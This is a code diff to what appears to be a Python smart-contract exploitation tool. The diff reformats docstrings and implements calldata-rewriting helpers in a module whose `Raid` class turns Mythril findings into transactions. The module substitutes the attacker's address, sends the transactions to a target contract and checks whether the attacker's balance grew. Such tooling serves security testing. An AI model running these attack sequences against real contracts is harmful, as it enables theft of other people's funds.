@@ -13,40 +13,49 @@ class Step:
     def func_hash(self) -> str:
         """ Returns the function signature hash (first eight characters of calldata)
 
-           :returns: function hash starting with '0x"
+        :returns: function hash starting with '0x"
 
-           """
+        """
+
         return self.call_data[:10]
 
     def func_args(self) -> str:
         """ Returns the function arguments (everything following the func hash)
 
-           :returns: calldata string
+        :returns: calldata string
 
-           """
+        """
+
         return self.call_data[10:]
 
-    def replace_raw(self, offset, str) -> None:
+    def replace_raw(self, offset, new: str) -> None:
         """ Replace a chunk of calldata
 
-           :param offset: start replacing from here
-           :returns:
+        :param offset: Byte offset into calldata ('0x' is not counted)
+        :param new: Replacement string ('0102aa..')
+        :returns"
 
-        .. todo:: Implement this
+        """
 
-           """
-        pass
+        self.call_data = (
+            self.call_data[: 2 + offset * 2]
+            + new
+            + self.call_data[2 + (offset * 2) + len(new) :]
+        )
 
-    def replace_uint526(self, offset, value: int) -> None:
+    def replace_uint(self, offset, value: int, size: int = 256) -> None:
         """ Replace an uint256 value in calldata
 
-           :param offset: start replacing from here
-           :returns:
+        :param offset: Byte offset into calldata (e.g. 4 = first arguemnt)
+        :param value: Replacement value
+        :param size: Integer width in bits
+        :returns:
 
-        .. todo:: Implement this
+        """
 
-           """
-        pass
+        hex_string = format(value, "x").zfill(int(size / 4))
+
+        self.replace_raw(offset, hex_string)
 
     def __repr__(self):
         return '{}(func_hash()="{}",func_args()={},value={})'.format(
@@ -95,10 +104,10 @@ class Raid:
     def parse_issue(issue: Issue) -> List[Step]:
         """Extract a list of Steps from a Mythril issue.
 
-           :param offset: Issue returned buy Mythril
-           :returns: List of Steps
+        :param offset: Issue returned buy Mythril
+        :returns: List of Steps
 
-           """
+        """
 
         result = []
         tx_sequence = issue.transaction_sequence
@@ -112,9 +121,9 @@ class Raid:
     def fix_calldata(self) -> None:
         """Replace ATTACKER_ADDRESS in the calldata with the address of the actual attacker.
 
-           :returns:
+        :returns:
 
-           """
+        """
         for step in self.steps:
             step.call_data = step.call_data.replace(
                 "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef", self.sender[2:]
@@ -123,10 +132,10 @@ class Raid:
     def execute_step(self, i: int) -> None:
         """Execute a single step
 
-           :param i: Step index
-           :returns:
+        :param i: Step index
+        :returns:
 
-           """
+        """
         self.w3.request_blocking(
             self.sender, self.target, self.steps[i].call_value, self.steps[i].call_data
         )
@@ -134,9 +143,9 @@ class Raid:
     def execute(self) -> None:
         """Execute all steps
 
-           :returns: True if attack was successful, false is otherwise.
+        :returns: True if attack was successful, false is otherwise.
 
-           """
+        """
         for i in range(0, len(self.steps)):
             self.execute_step(i)
 
@@ -145,7 +154,7 @@ class Raid:
     def is_pwned(self) -> bool:
         """Check whether the exploit was successful (i.e. the attacker's balance has increased).
 
-           :returns: True if attack was successful, false otherwise.
+        :returns: True if attack was successful, false otherwise.
 
-           """
+        """
         return self.w3.balance(self.sender) > self.initial_balance
